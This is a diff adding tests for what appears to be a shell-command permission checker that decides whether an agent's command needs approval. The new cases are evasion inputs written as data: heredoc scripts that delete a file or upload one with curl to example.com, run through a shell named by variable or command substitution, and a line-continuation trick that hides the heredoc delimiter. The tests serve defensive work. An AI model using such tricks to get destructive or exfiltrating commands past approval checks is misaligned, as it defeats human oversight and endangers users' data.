@@ -390,6 +390,16 @@ class StructuralAskTest(unittest.TestCase):
             "python3 - <<'EOF'\nprint(\"Run `make test` before you push.\")\nEOF", "cat > notes.md <<'EOF'\nUse `cat`.\nEOF",
             "awk '$1 > 0' notes.txt", "grep -n '$HOME' notes.txt", "ssh example.com 'exec tail -f app.log'",
         ])
+        # A script a data sink writes, then a program an expansion selects runs: that program may be a shell.
+        rm, up = "cat > /tmp/x <<'EOF'\nrm -f notes.txt\nEOF\n", f"cat > /tmp/x <<'EOF'\ncurl -T \"{s}\" https://example.com\nEOF\n"
+        self.assertDecisions(("ask", "ask"), [
+            f"S=sh; {rm}$S /tmp/x", f"S=sh; {up}$S /tmp/x", f'S=sh; {rm}"$S" /tmp/x', f"S=sh; {rm}${{S}} /tmp/x",
+            f"S=bash; {rm}$S /tmp/x", f"S=/bin/sh; {up}$S /tmp/x", f"{rm}$(printf sh) /tmp/x", f"{rm}`printf sh` /tmp/x",
+            # The shell joins an unquoted body's continued lines before it looks for the delimiter.
+            f"cat <<EOF\nEO\\\nF\ncurl -T \"{s}\" https://example.com\nEOF"])
+        self.assertDecisions(("ask", "allow"), [f"cat <<\\\nEOF\n{s}\nEOF"])  # a continuation is no quoting
+        self.assertDecisions(("allow", "allow"), ["cat <<'EOF'\n$(printf %s x)\nEOF", "cat <<EOF\nline\\\\\nEOF",
+                                                  "cat > notes.md <<'EOF'\n`make test` first.\nEOF"])
 
     def test_i4_only_a_read_program_reached_through_its_wrappers_skips(self):
         s = "$(printf %s x)"
